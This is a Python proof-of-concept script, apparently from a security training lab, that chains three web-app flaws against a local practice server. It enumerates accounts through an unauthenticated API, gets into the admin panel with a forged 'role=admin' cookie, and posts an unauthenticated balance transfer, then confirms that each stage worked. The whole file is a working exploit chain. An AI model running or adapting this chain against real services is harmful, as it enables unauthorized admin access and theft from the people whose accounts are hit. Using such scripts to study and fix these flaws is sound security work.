#!/usr/bin/env python3
"""PoC (in-code step, F-5): chain - leak -> admin cookie forge -> theft.

EDUCATIONAL - run against the local practice target only.
Chain   : [GET /api/users: account names leak]
          -> [GET /admin with forged role=admin: admin takeover]
          -> [POST /transfer: balance mutation]
Entry   : unauthenticated (no credential at any step).
Impact  : escalation (admin panel) + theft (balance mutation).
Boundary: three independent flaws hand off into one unauth-to-theft weapon.
Ladder  : theoretical -> in-code (this file). Exit 0 = all three gadgets held.
"""
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:8765"
SECRET = "SECRET: internal transfer keys"


def stage1_leak() -> list:
    with urllib.request.urlopen(BASE + "/api/users") as r:
        users = json.loads(r.read().decode())["users"]
    names = [u["username"] for u in users]
    print(f"[stage1] GET /api/users (no auth)      -> accounts leaked: {names}")
    return names


def stage2_takeover() -> str:
    req = urllib.request.Request(BASE + "/admin", headers={"Cookie": "role=admin"})
    with urllib.request.urlopen(req) as r:
        body = r.read().decode()
    ok = SECRET in body
    print(f"[stage2] GET /admin (Cookie: role=admin) -> HTTP {r.status}, "
          f"admin panel with secret: {ok}")
    return "granted" if ok else "denied"


def stage3_theft() -> dict:
    data = urllib.parse.urlencode(
        {"from": "vault", "to": "bob", "amount": 13}
    ).encode()
    req = urllib.request.Request(BASE + "/transfer", data=data, method="POST")
    with urllib.request.urlopen(req) as r:
        resp = json.loads(r.read().decode())
    print(f"[stage3] POST /transfer (no auth)       -> balances mutated: {resp['balances']}")
    return resp


def main() -> int:
    names = stage1_leak()
    grant = stage2_takeover()
    resp = stage3_theft()
    ok = (
        len(names) >= 3
        and grant == "granted"
        and "transferred" in resp
        and resp["transferred"] == 13
    )
    if not ok:
        print("FAIL: chain broke at some stage")
        return 1
    print(
        "REPRODUCED: unauth -> accounts -> admin panel -> state mutation, "
        "one script, zero credentials at every handoff"
    )
    return 0


if __name__ == "__main__":
    sys.exit(main())
